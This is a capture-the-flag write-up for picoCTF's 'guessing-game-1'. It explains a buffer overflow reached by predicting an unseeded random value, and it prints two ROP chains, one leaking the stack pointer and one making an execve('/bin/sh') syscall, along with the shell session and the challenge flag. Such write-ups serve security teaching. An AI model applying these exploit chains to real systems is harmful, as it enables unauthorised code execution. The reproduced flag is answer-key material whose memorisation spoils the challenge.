# guessing-game-1

PRNG, ROP (Leak address), rop2syscall

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/guessing-game-1/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

No PIE, so function addresses can be used as taken from the symbol table. 

The next section explains why we know that there is in fact no stack canary. 

## Other Details of Note (about the Binary)

The [Makefile](./Makefile) tells us that the binary is **statically-linked**, meaning all the used `libc` (and other included) functions are already linked into the [final executable](./vuln). This provides fertile ground to

1. utilize `libc` functions, and/or
2. farm for ROP gadgets. 

The Makefile also tells us that the binary was compiled with the `-fno-stack-protector` flag, so there is actually no stack canary. `pwntools` probably is detecting the presence of canaries due to their existence in (some/all of) the statically-linked functions. 

## Overview of Binary

The `win` function of the binary is as follows, where BUFSIZE is globally defined in a preprocessor macro to be 100

```c
void win() {
	char winner[BUFSIZE];
	printf("New winner!\nName? ");
	fgets(winner, 360, stdin);
	printf("Congrats %s\n\n", winner);
}
```

Clearly, there exists a possible buffer overflow to be exploited, and there is no canary, see [Other Details of Note (about the Binary)](#other-details-of-note-about-the-binary). 

To reach the `win` function, we need to pass a check against a value generated from an unseeded PRNG (incremented by 1), which isn't particularly difficult (see the [solve script](./solve.py) for use of the `ctype` library). 

## rop2libc

We're like to call `libc`'s `system`, but it is not used and thus not linked into the executable. 

Instead, we will use a syscall to run `execve` on the `/bin/sh` string. However, this requires that we first store the `/bin/sh` string at a known address. 

### ROP Chain 1: Storing the `/bin/sh` string

#### Attempt 1: Storing `/bin/sh` in a malloc-ed chunk

At first I attempted to perform a call to `malloc` and multiple calls to `memset` to store the `/bin/sh` string into a heap chunk, but this would definitely exceed the number of characters accepted by the vulnerable `fgets` function (we'd need to call `malloc` 8 times, for one). Nonetheless, some incomplete code can be found in [malloc_attempt.txt](./malloc_attempt.txt). 

#### Attempt 2: Leaking `rsp`

The concept of "leaking `rsp`" through ROP gadgets is that we move the value of `rsp` into `rdi`, and also write that value into (through intermediaries such as `rax` and writing into `[rdi + 0x8]`) whatever `rdi` will end up pointing to. 

If we then call `puts`, as long as there are no null bytes in the leaked `rsp` value before the leading null bytes (if there are, just re-run the exploit), then the little-endian architecture allows the value to be leaked, smallest-byte first. 

Finally, we call `win` to reopen the attack surface (i.e. "reset" the overflow vulnerability) so as to use the leaked value in [ROP Chain 2](#rop-chain-2-execvebinsh-syscall). 

The ROP chain to achieve this is as follows

```c
[*] ROP Chain 1:
    0x0000:         0x44cc26 pop rdx; ret
    0x0008:         0x44cc49 pop rdx; pop rsi; ret
    0x0010:         0x48315a
    0x0018:         0x410b62
    0x0020:         0x400ed8 pop rbx; ret
    0x0028:         0x410ca0 pop r13; pop r14; ret
    0x0030:         0x44f6c8
    0x0038:         0x45bf5b
    0x0040:         0x4172c6
    0x0048:         0x400ed8 pop rbx; ret
    0x0050:              0x8 __libc_tsd_LOCALE
    0x0058:         0x41025d pop r14; pop rbp; ret
    0x0060:      b'yaaazaab' <pad r14>
    0x0068:         0x44cc4a
    0x0070:         0x490d13
    0x0078:         0x44cc4b
    0x0080:         0x411120 puts()
    0x0088:         0x400c40 win()
```

For more detailed explanations of what each step is doing, refer to the comments written in the [solve script](./). 

Lastly, stepping through this other `win` function in gdb, we realize that by pure coincidence, the leaked `$rsp` value is exactly the starting of the address of the buffer of that the `fgets` in `win` writes to. 

We can therefore write `/bin/sh\x00` into the first 8 bytes of our buffer and the leaked `rsp` value will point right at it. 

> HINDSIGHT: Reading other players' writeups provided the realization that the `/bin/sh` string could have just as well been written into the `.data` or `.bss` segment (which is static as there is no PIE), thus avoiding all the above `rsp`-leaking shenanigans. Oh well, lesson learnt...

### ROP Chain 2: `execve("/bin/sh")` syscall

Based on [this reference about passing parameters to x86-64 syscalls](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md) and [this StackOverflow post](https://stackoverflow.com/questions/36673765/why-can-the-execve-system-call-run-bin-sh-without-any-argv-arguments-but-not) (which is for x86, but apparently works in this x86-64 case too), in order to perform the `execve` syscall on the `/bin/sh` C string, we only need

1. `rax` = 0x3b,
2. `rdi` to contain a pointer to a `/bin/sh` string, 
3. `rsi` to contain a null pointer, and 
4. `rdx` to contain a null pointer. 

The ROP chain that achieves this is

```c
[*] ROP Chain 2:
    0x0000:         0x44cc49 pop rdx; pop rsi; ret
    0x0008:              0x0
    0x0010:              0x0
    0x0018:         0x4163f4 pop rax; ret
    0x0020:             0x3b
    0x0028:         0x400696 pop rdi; ret
    0x0030:   0x7fff03638ee0
    0x0038:         0x40137c syscall
```

where the value at `0x0030` is the leaked `rsp` value from ROP chain 1. 

## Flag

```python
[+] Opening connection to jupiter.challenges.picoctf.org on port 26735: Done
[*] Loaded 128 cached gadgets for './vuln'
[*] ROP Chain 1:
    0x0000:         0x44cc26 pop rdx; ret
    ...
[*] hex(leaked_rsp)='0x7fff7175b850'
[*] ROP Chain 2:
    0x0000:         0x44cc49 pop rdx; pop rsi; ret
    ...
[*] Switching to interactive mode
Congrats /bin/sh

$ ls
flag.txt
vuln
vuln.c
xinet_startup.sh
$ cat flag.txt
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b751b438dd8c4bb7}
```

## Interesting Alternative Methods (Other Writeups)

- [Using the statically-linked `_dl_make_stack_executable` to make the stack executable](https://github.com/onealmond/hacking-lab/blob/master/picoctf-2020/guessing-game1/writeup.md)